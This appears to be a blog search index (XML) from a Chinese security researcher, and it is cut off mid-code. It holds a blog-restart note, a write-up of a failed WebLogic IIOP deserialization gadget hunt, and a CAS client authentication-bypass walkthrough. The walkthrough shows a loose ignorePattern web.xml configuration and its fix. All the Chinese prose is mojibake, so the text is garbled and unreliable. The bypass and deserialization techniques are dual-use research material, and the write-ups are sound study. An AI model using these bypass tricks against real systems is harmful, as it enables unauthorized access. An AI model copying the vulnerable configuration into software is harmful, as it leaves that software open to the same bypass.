<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>åšå®¢é‡å¯å°è®°ï¼ˆ2ï¼‰</title>
    <url>/2024/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<p>æœ‰ä¸¤å¹´å¤šå¹´æ²¡æœ‰å†™åšå®¢äº†ï¼Œæœ€è¿‘ä¸€æ¬¡å†™çš„è¯é¢˜è¿˜æ˜¯weblogic RCEæŒ–æ˜ ã€Šè®°ä¸€æ¬¡å¤±è´¥çš„Weblogic IIOP GadgetæŒ–æ˜ã€‹ã€‚è™½ç„¶å½“æ—¶å†™çš„æ—¶å€™æ ‡é¢˜æ˜¯â€œå¤±è´¥çš„â€ï¼Œä½†å…¶å®åé¢ç¡®å®å¯å‘äº†å¦ä¸€ä½å¸ˆå‚…æ‹¿åˆ°äº†RCE ï¼ˆCVE-2022-21420ï¼‰ã€‚æˆ‘è¦æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼Œä¸ä½†å› ä¸ºå®ƒæŒ½æ•‘äº†è¿™æ¬¡å¤±è´¥çš„åˆ©ç”¨ï¼Œè¿˜å› ä¸ºå®ƒæ€»æ˜¯åœ¨è¿‡å¹´çš„æ—¶å€™ç»™æˆ‘å‘çº¢åŒ…ï¼Œæ‰‹åŠ¨ç‹—å¤´ã€‚</p>
<p>å®‰å…¨ç ”ç©¶æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œæ˜¯å®ˆæ­£å‡ºå¥‡ï¼Œæ˜¯æ¨é™ˆå‡ºæ–°ï¼Œæ˜¯å¯¹åˆ›é€ åŠ›çš„ç£¨ç»ƒã€‚æœ‰ä¸€èµ·ç ”ç©¶æŠ€æœ¯çš„å°ä¼™ä¼´æ˜¯å¹¸ç¦çš„ï¼Œæ„Ÿè°¢å¤§å­¦å››å¹´èƒ½é‡åˆ°Sycloverå°ç»„ã€‚</p>
<p>æ¯•ä¸šåå»äº†ä¸Šæµ·ï¼Œåˆè¾—è½¬é¦™æ¸¯ï¼Œå¦‚ä»Šä¸Šå¡ä¸¤å¹´äº†ï¼Œå‡†å¤‡ç¬¬äºŒæ¬¡é‡å¯æˆ‘çš„åšå®¢ã€‚æœªæ¥å‡†å¤‡æ›´æ–°ä¸€äº›å­¦ä¹ binaryå’Œdistributed systemçš„å­¦ä¹ ç¬”è®°ã€‚</p>
<p>ä¹‹å‰redteam.todayåŸŸåå·²ç»è¢«åˆ«äººä¹°èµ°ï¼Œä»¥åæ‰“ç®—é•¿æœŸç”¨cl0und.github.ioäº†ã€‚çœ‹åˆ°åšå®¢å‹é“¾ä¸­èƒ½æ­£å¸¸è®¿é—®çš„å·²ç»æ‰€å‰©æ— å‡ ï¼Œè¿™æ›´è®©æˆ‘åˆ°ä½“ä¼šé•¿æœŸå†™åšå®¢çš„ä¸æ˜“ã€‚å¸Œæœ›è¿™æ¬¡æˆ‘èƒ½åšæŒå¾—æ›´ä¹…ä¸€äº›ğŸ˜†</p>
<p>é¡ºé¢‚å¤å®‰ã€‚</p>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡å¤±è´¥çš„Weblogic IIOP GadgetæŒ–æ˜</title>
    <url>/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<!-- more -->
<h2 id="å‰è®°"><a href="#å‰è®°" class="headerlink" title="å‰è®°"></a>å‰è®°</h2><p>å½“æ—¶ä»¥ä¸ºæŒ–æˆåŠŸäº†ï¼Œç»“æœåæ¥å‘ç°æ˜¯å°‘æ‰“äº†ä¸€ä¸ªè¡¥ä¸ï¼Œåœ¨æœ‹å‹åœˆè™šæ™ƒäº†ä¸€æªã€‚ä¸è¿‡æ•´ä¸ªåˆ©ç”¨æ€è·¯è¿˜ç®—æœ‰è¶£ï¼Œè¿™å¹¶ä¸å¦¨ç¢åœ¨è¿™é‡Œåˆ†äº«ä¸€ä¸‹ã€‚</p>
<h2 id="sinkç‚¹å¯è¡Œæ€§éªŒè¯"><a href="#sinkç‚¹å¯è¡Œæ€§éªŒè¯" class="headerlink" title="sinkç‚¹å¯è¡Œæ€§éªŒè¯"></a>sinkç‚¹å¯è¡Œæ€§éªŒè¯</h2><p>å¼€å±€é£å¹²å¸ˆå‚…é€äº†ä¸ªsinkç‚¹ã€‚</p>
<p><img src="image-20220304173625-rfymfzd.png" alt="image.png"></p>
<p>æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹sinkç‚¹com.tangosol.coherence.transaction.internal.storage.KeyBackingMap#putçš„å¯è¡Œæ€§ã€‚</p>
<p><img src="image-20220304173841-084s55s.png" alt="image.png"></p>
<p>å¦‚æœè¿™é‡Œthis.m_contextæ˜¯ReplicatedCache$BackingMapContextï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¿›å…¥BackingMapContext#getValueFromInternalConverterå†è¿›å…¥getConverterFromInternalã€‚</p>
<p><img src="image-20220304174359-croe38f.png" alt="image.png"></p>
<p>å› ä¸ºthis.__m_ConverterFromInternalä¸ºtransientåœ¨ååºåˆ—çš„æ—¶å€™ä¸ºç©ºï¼Œæ ¹æ®ä»£ç é€»è¾‘ååºåˆ—åŒ–çš„æ—¶å€™ä¼šåˆ›ä¸€ä¸ªæ–°çš„converterï¼Œå¹¶è°ƒç”¨convertæ–¹æ³•è½¬æ¢å—æ§çš„oValçš„å¯¹è±¡ã€‚</p>
<p><img src="image-20220304174728-h7fb6qs.png" alt="image.png"></p>
<p>æˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼Œçœ‹ä¸€ä¸‹converteræ˜¯ä»€ä¹ˆæ ·å­çš„, converterç±»å‹å›ºå®šReplicatedCache$ConverterFromInternalã€‚</p>
<p><img src="image-20220304175214-4sf1oh8.png" alt="image.png"></p>
<p>ReplicatedCache$ConverterFromInternalçš„convertã€‚</p>
<p><img src="image-20220304175319-iu49dix.png" alt="image.png"></p>
<p>æ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Ÿæ²¡é”™ï¼Œ<a href="https://xz.aliyun.com/t/9068">æ˜¯æˆ‘å»å¹´æŒ–weblogicçš„æ—¶å€™æ‰¾åˆ°çš„sinkç‚¹</a>, äºŒé˜¶ååºåˆ—åŒ–ç±»å‹ã€‚</p>
<h2 id="è¡¥å…¨gadget"><a href="#è¡¥å…¨gadget" class="headerlink" title="è¡¥å…¨gadget"></a>è¡¥å…¨gadget</h2><p>é‚£ä¹ˆç°åœ¨éœ€è¦ä»sourceç‚¹æ‰¾ä¸€æ¡é€šè·¯ï¼Œæ”¾å…¥å¸¸è§çš„sourceç‚¹è‡ªåŠ¨åŒ–è·‘ï¼Œæ— å¥ˆå·¥å…·å¤ªèœï¼Œå¤§æµ·æé’ˆã€‚æåˆ°ä¸€ä¸ªï¼Œåº”è¯¥è¿˜æœ‰å…¶ä»–çš„ï¼Œæˆ‘æ²¡ä¸€ä¸ªä¸€ä¸ªçœ‹äº†ã€‚</p>
<p><img src="image-20220304225954-l24t1tq.png" alt="image.png"></p>
<p>æ¥ä¸‹æ¥å†ç”¨BadAttributeValueExpExceptionå‰åŠæ®µå°±å®Œå…¨èµ°é€šäº†ã€‚</p>
<h2 id="æ„é€ expä¸javaassitçš„å¦™ç”¨"><a href="#æ„é€ expä¸javaassitçš„å¦™ç”¨" class="headerlink" title="æ„é€ expä¸javaassitçš„å¦™ç”¨"></a>æ„é€ expä¸javaassitçš„å¦™ç”¨</h2><p>è·¯å¾„æ‰¾åˆ°äº†æ¥ç€ï¼Œå°±æ˜¯å¡«å……ä¸€äº›å¿…è¦çš„æ¡ä»¶ï¼Œæ„é€ payloadäº†ã€‚</p>
<p>æ„é€ çš„æ—¶å€™ä¼šå‘ç°å¯¹com.tangosol.coherence.component.util.daemon.queueProcessor.Serviceæœ‰ä¾èµ–ã€‚è¿™ä¸ªç±»æ˜¯å®ç°äº†Serializableæ¥å£çš„ï¼Œä½†æ˜¯å®˜æ–¹çš„æœ¬æ„æ˜¯ä¸æƒ³è®©å®ƒè¢«åºåˆ—åŒ–çš„ï¼Œ</p>
<p><img src="image-20220304210431-375u930.png" alt="image.png"></p>
<p>ä¸è¿‡åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰åšå¯¹åº”çš„æ£€æŸ¥ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨javaassitå¼ºè¡ŒæŠŠè¿™ä¸ªæ–¹æ³•æ”¹æˆ$1.defaultWriteObject();</p>
<p>ç±»ä¼¼çš„ï¼Œjavaassitçš„å¦™ç”¨è¿˜å¯ä»¥å‡è½»æ„é€ payloadæ—¶å€™çš„ç—›è‹¦ï¼Œæˆ‘ä»¬å¯ä»¥å®¡è®¡ä¸€éƒ¨åˆ†ä»£ç ï¼Œç”¨javaassitæŠŠæ²¡ç”¨çš„é€»è¾‘é˜‰å‰²æ‰ã€‚</p>
<p>ä¾‹å¦‚KeyBackingMapæ„é€ æ–¹æ³•ä¸­</p>
<p><img src="image-20220304211223-x6gne8z.png" alt="image.png"></p>
<p>context.getCacheService().getInfo().getServiceName(), ä¸€æ³¢è¿ç¯å¤ºå‘½callè¦æ­£å¸¸è¿è¡Œéœ€è¦å„ç§è¡¥å…¨æ¡ä»¶ï¼Œä¸€æ³¢æ“ä½œå°±ä¸ºäº†æ‹¿ä¸€ä¸ªæ²¡ä»€ä¹ˆåµç”¨çš„å­—ç¬¦ä¸²ã€‚</p>
<h2 id="å±±ç©·æ°´å°½ç–‘æ— è·¯"><a href="#å±±ç©·æ°´å°½ç–‘æ— è·¯" class="headerlink" title="å±±ç©·æ°´å°½ç–‘æ— è·¯"></a>å±±ç©·æ°´å°½ç–‘æ— è·¯</h2><p>è‡³æ­¤ä¸€åˆ‡éƒ½åœ¨å‘å¥½çš„æ–¹å‘å‘å±•ï¼Œé¦–å…ˆæˆ‘ç”¨æ²¡æ‰“è¡¥ä¸weblogicèµ°äº†ä¸€æ³¢t3ï¼Œä¸€å‘å…¥é­‚ï¼Œç¨³ç¨³çš„ã€‚æ‰“ä¸Šæœ€æ–°è¡¥ä¸åèµ°t3æ²¡æˆåŠŸï¼Œçœ‹æŠ¥é”™æƒ³èµ·äº†æ˜¯å»å¹´oracleç»™t3åŠ äº†ä¸€ä¸ªABBREV_CLASSESç™½åå•ã€‚</p>
<p><img src="image-20220304213624-3kn8um9.png" alt="image.png"></p>
<p>ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨iiopé‡æ‹³å‡ºå‡»ã€‚é•¿ä¹…ä»¥æ¥æˆ‘ä¸€ç›´è§‰å¾—t3å’Œiiopæ˜¯ç­‰ä»·çš„ä¸œè¥¿ï¼Œexpèµ°t3æˆåŠŸï¼Œé‚£èµ°iiopä¹Ÿå¯æˆåŠŸï¼Œå› æ­¤ä¸€ç›´è§‰å¾—å®˜æ–¹å•ç‹¬ç»™t3åŠ ç™½çš„æ“ä½œä¸å¤šä½™ä½†æ²¡å¿…è¦ã€‚</p>
<p>ç›´åˆ°æ‰“å®Œå‘ç°æ²¡æˆåŠŸï¼Œè¿™ä¸‹æœ‰ç‚¹å‚»çœ¼äº†ã€‚<br><img src="image-20220304213955-rx8vczj.png" alt="image.png"></p>
<p>çœ‹èµ·æ¥iiopå’Œt3åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿˜æ˜¯æœ‰ä¸åŒã€‚æ ¹æ®è°ƒç”¨æ ˆå’Œè°ƒè¯•å¯ä»¥å®šä½åˆ°å‡ºé”™registerMessageTypeä¸­çš„getMessageClassMapã€‚</p>
<p><img src="image-20220304221011-g7od395.png" alt="image.png"></p>
<p><img src="image-20220304221737-pc9vl4s.png" alt="image.png">)<img src="image-20220304221750-gjzcpbp.png" alt="image.png"></p>
<p>çœ‹åˆ°è¿™é‡Œä½ å¯èƒ½å……æ»¡ç–‘æƒ‘</p>
<ul>
<li>ååºåˆ—åŒ–ä¸æ˜¯å¯ä»¥æ§åˆ¶ä»»æ„æˆå‘˜å˜é‡ï¼ˆä¸ä¸¥è°¨ï¼‰å—ï¼Ÿæå‰ç»™__m_MessageClassMapè®¾ç½®å¥½ï¼Œä¸å°±å¯ä»¥è§„é¿ç©ºæŒ‡é’ˆçš„é—®é¢˜ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆt3çš„æ—¶å€™æ²¡æœ‰é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Ÿ</li>
</ul>
<p>è¿™é‡Œé™äºç¯‡å¹…ï¼Œæˆ‘å°±ç›´æ¥è¯´æˆ‘è°ƒè¯•çš„ç»“è®ºäº†ã€‚</p>
<p>å…³äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œç¡®å®å¯ä»¥æ§åˆ¶ï¼Œä½†æ˜¯è¿™é‡Œæ¶‰åŠååºåˆ—åŒ–æ—¶åºçš„é—®é¢˜ï¼Œå°±ç®—è®¾ç½®äº†__m_MessageClassMapï¼Œé€»è¾‘èµ°åˆ°è¿™ä¸€æ­¥çš„æ—¶å€™æˆå‘˜å˜é‡è¿˜æ²¡æœ‰è¢«èµ‹å€¼ã€‚</p>
<p>å…³äºç¬¬äºŒä¸ªé—®é¢˜ï¼Œæ˜¯å› ä¸ºèµ°iiopæ—¶ï¼Œååºåˆ—åŒ–Componentæ—¶registerVaildationè°ƒç”¨æŠ›å‡ºå¼‚å¸¸äº†ï¼Œè¿›å…¥äº†t3æƒ…å†µä¸‹ä¸ä¼šè¿›å…¥çš„validateObjectã€‚</p>
<p><img src="image-20220304222857-dwd6vqx.png" alt="image.png"></p>
<p>è€Œå‡ºç°å¼‚å¸¸çš„åŸå› æ˜¯ä¹Ÿå°±æ˜¯depthä¸º0ã€‚</p>
<p><img src="image-20220304223120-g4g323u.png" alt="image.png"></p>
<p>é€šå¸¸æƒ…å†µä¸‹depthä¼šéšç€ååºåˆ—åŒ–æ—¶çš„æ·±åº¦åŠ¨æ€å˜åŒ–ï¼Œå› æ­¤æˆ‘çŒœå¼€å‘çš„æœ¬æ„æ˜¯ç¦æ­¢Componentæˆä¸ºæœ€å¤–å±‚çš„å¯¹è±¡ã€‚</p>
<p><img src="image-20220304223702-prcmt93.png" alt="image.png"></p>
<p>ä½†æ˜¯IIOPå› ä¸ºè‡ªèº«å®ç°çš„åŸå› ï¼Œè¿›å…¥äº†readObjectOverrideï¼Œä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰è¿›å…¥readObject0ã€‚ä¹Ÿå°±è¯´æ•´ä¸ªè¿‡ç¨‹depthä¸€ç›´ä¸º0ã€‚</p>
<p><img src="image-20220304224620-r2flbv8.png" alt="image.png"></p>
<p>è‡³æ­¤æƒ…å†µå˜å¾—å¾ˆéš¾å—ã€‚t3ç™½åå•æ‰“ä¸äº†ï¼Œiiopå› ä¸ºè¿™ä¸ªgadgetä¾èµ–äº†ç‰¹æ®Šçš„ç±»ä¹Ÿæ‰“ä¸äº†ã€‚åŠŸè´¥å‚æˆï¼Œæˆ‘å½“æ—¶è§‰å¾—éå¸¸å¯æƒœã€‚åˆæŠ˜è…¾ä¸€ä¼šæ‰¾ä¸åˆ°æ›¿ä»£ç±»å°±æ”¾å¼ƒäº†ã€‚</p>
<h2 id="æŸ³å²¸èŠ±æ˜åˆä¸€æ‘"><a href="#æŸ³å²¸èŠ±æ˜åˆä¸€æ‘" class="headerlink" title="æŸ³å²¸èŠ±æ˜åˆä¸€æ‘"></a>æŸ³å²¸èŠ±æ˜åˆä¸€æ‘</h2><p>å¤§çº¦è¿‡äº†ä¸‰å‘¨ä¹‹åï¼Œæˆ‘åˆæƒ³èµ·äº†è¿™ä¸ªæ´ï¼Œçªç„¶eurekaã€‚æ—¢ç„¶æ­£å¸¸æµèƒ½æ‰“iiopä¸èƒ½æ‰“ï¼Œé‚£èƒ½ä¸èƒ½æŠŠiiopâ€œè½¬æ¢â€æˆæ­£å¸¸æµç„¶åå†æ‰“å‘¢ï¼Ÿ</p>
<p>å…¶å®é€šè¿‡æŸ¥çœ‹<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">å†å²æ¼æ´</a>å¯ä»¥çŸ¥é“CVE-2016-3510å°±å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚</p>
<p><img src="image-20220306223053-llrmlnj.png" alt="image.png"></p>
<p>è‡³æ­¤ï¼Œå…¨é“¾è·¯å·²ç»æ‰“é€šã€‚</p>
<h2 id="ä¸ºä»€ä¹ˆå¤±è´¥"><a href="#ä¸ºä»€ä¹ˆå¤±è´¥" class="headerlink" title="ä¸ºä»€ä¹ˆå¤±è´¥"></a>ä¸ºä»€ä¹ˆå¤±è´¥</h2><p>äº¤ç»™å®˜æ–¹ä¹‹åè¢«é©³å›äº†ï¼Œåæ¥å‘ç°æµ‹è¯•çš„æ—¶å€™å°‘äº†ä¸€ä¸ªè¡¥ä¸ã€‚</p>
<p>æ‰“è¡¥ä¸å‰ï¼š</p>
<p><img src="image-20220314134013-liz2r0c.png" alt="image.png"></p>
<p>æ‰“è¡¥ä¸åï¼š</p>
<p>è¿™é‡Œthis.setFilteré»˜è®¤ä¸ºtrueï¼Œä¹Ÿå°±è¯´ä»2021çš„æŸä¸€æ¬¡è¡¥ä¸ä¹‹åfromBinaryè¿™ä¸ªç‚¹åŠ äº†é»‘åå•å·²ç»æ‰“ä¸äº†ã€‚</p>
<p><img src="image-20220314135356-eyrxbug.png" alt="image.png"></p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è™½ç„¶æ ¹æ®CVE-2016-3510ï¼Œiiopå’Œt3åœ¨æ¼æ´åˆ©ç”¨ä¸Šå·²ç»å®Œå…¨ç­‰ä»·äº†ã€‚t3ç™½ä¸ç™½å·²ç»ä¸é‡è¦äº†ï¼Œä½†t3ç™½åå•çœŸçš„æ— æ³•ç»•è¿‡å—ï¼Ÿå…¶å®æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™é‡Œç©ºç™½å¤ªå°å†™ä¸ä¸‹â€¦â€¦</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Two Tricks Of CAS-CLIENT AUTH Bypass</title>
    <url>/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/</url>
    <content><![CDATA[<p>é¦–å‘äº<a href="https://xz.aliyun.com/t/9557">å…ˆçŸ¥ç¤¾åŒº</a></p>
<!-- more -->
<p>cas client ç”¨äºé™åˆ¶åŒ¿åç”¨æˆ·å¯¹æŸäº›ç‰¹å®šapiçš„è®¿é—®ï¼Œåœ¨ä¸€äº›ç‰¹æ®Šçš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šæœ‰æƒé™ç»•è¿‡é—®é¢˜ã€‚ä¸‹é¢åˆ†äº«ä¸¤ä¸ªå®é™…ç”Ÿæ´»ä¸­é‡åˆ°çš„æ¡ˆä¾‹ã€‚</p>
<h2 id="bypass-trick1-ignorePattern"><a href="#bypass-trick1-ignorePattern" class="headerlink" title="bypass trick1 ignorePattern"></a>bypass trick1 ignorePattern</h2><h3 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>/api/adminè¿™ä¸ªurlæ˜¯éœ€è¦casç™»é™†æ‰èƒ½è®¿é—®çš„ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdminController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/api/admin"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>/api/guestè¿™ä¸ªæ˜¯å…¬å…±é¡µé¢ï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥çœ‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GuestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(<span class="string">"/api/guest"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">guest</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"hello guest"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æ­¤ç¨‹åºçš„æŠ€æœ¯æ¯”è¾ƒè€æ—§ï¼Œä¸ºäº†å®ç°ä¸Šé¢è¿™ç§éœ€æ±‚ï¼Œé‚£ä¹ˆå¼€å‘å¯èƒ½ä¼šåœ¨web.xmlä¸­è¿™ä¹ˆé…ç½®ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.authentication.AuthenticationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerUrlPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://battags.ad.ess.rutgers.edu:8443/cas<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://www.acme-client.com<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/api/guest<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·é…ç½®çœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰é—®é¢˜<br><img src="20210510105915-b44b6e76-b13b-1.png" alt="image.png"></p>
<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>ä½†æ˜¯å…¶å®å¯ä»¥è¢«èŠ±å¼ç»•è¿‡ã€‚</p>
<p><img src="20210510105932-bea9e8de-b13b-1.png" alt="image.png"></p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åŸå› æœ‰ä¸¤ç‚¹ï¼Œç¬¬ä¸€org.jasig.cas.client.authentication.AuthenticationFilterï¼Œåœ¨åŒ¹é…æ—¶å€™è·å–äº†åŸç”Ÿurlï¼ˆæœªå¤„ç†../ï¼‰ï¼Œç”šè‡³åŒ…æ‹¬<code>?</code> åçš„å†…å®¹ã€‚</p>
<p><img src="20210510105946-c6c565ca-b13b-1.png" alt="image.png"></p>
<p>ç¬¬äºŒï¼Œfilterçš„åŒ¹é…æ¨¡å¼æœ‰å››ç§ï¼Œé»˜è®¤æ˜¯æŒ‰æ­£åˆ™åŒ¹é…ã€‚<br><img src="20210510105953-cb7b4b34-b13b-1.png" alt="image.png"></p>
<p><img src="20210510110002-d0cd2f3a-b13b-1.png" alt="image.png"></p>
<p>åŒç†å¦‚æœé…ç½®æˆCONTAINSä¹Ÿä¼šæœ‰ç±»ä¼¼çš„é—®é¢˜ã€‚</p>
<p>åŒç†å°è£…äº†è¿™ä¸ªåº“çš„ä¸‰æ–¹åº“ä¹Ÿä¼šæœ‰é—®é¢˜ï¼Œæ¯”è¾ƒæµè¡Œçš„æ˜¯<strong><a href="https://github.com/Unicon/cas-client-autoconfig-support">cas-client-autoconfig-support</a></strong>  ï¼Œå®ƒå¸¸ä¸springbooté›†æˆä½¿ç”¨ï¼Œå¦‚æœæœ‰å¦‚ä¸‹é…ç½®ä¹Ÿä¼šå‡ºé—®é¢˜ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cas.ignorePattern&#x3D;&#x2F;api&#x2F;guest</span><br></pre></td></tr></table></figure>

<h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>æ‰€ä»¥æ­£ç¡®çš„é…ç½®åº”è¯¥æ”¹ä¸º</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>^/api/guest$<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªå¯ä»¥ç®—æ´ï¼ˆæ²¡å¤„ç†../è€Œä¸”containsè¿™ç§é€‰é¡¹å°±ä¸åº”è¯¥å­˜åœ¨ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”©é”…ç»™å¼€å‘æ²¡ä»”ç»†çœ‹æ–‡æ¡£ã€‚</p>
<h2 id="bypass-trick2-useSuffixPatternMatch"><a href="#bypass-trick2-useSuffixPatternMatch" class="headerlink" title="bypass trick2 useSuffixPatternMatch"></a>bypass trick2 useSuffixPatternMatch</h2><h3 id="åœºæ™¯-1"><a href="#åœºæ™¯-1" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>è¿™é‡Œå‡è®¾/adminç³»åˆ—çš„è·¯ç”±éƒ½ä¸å…è®¸è®¿é—®ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdminController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(</span><br><span class="line">            value = &#123;<span class="string">"/admin"</span>&#125;,</span><br><span class="line">            method = &#123;RequestMethod.GET&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(</span><br><span class="line">          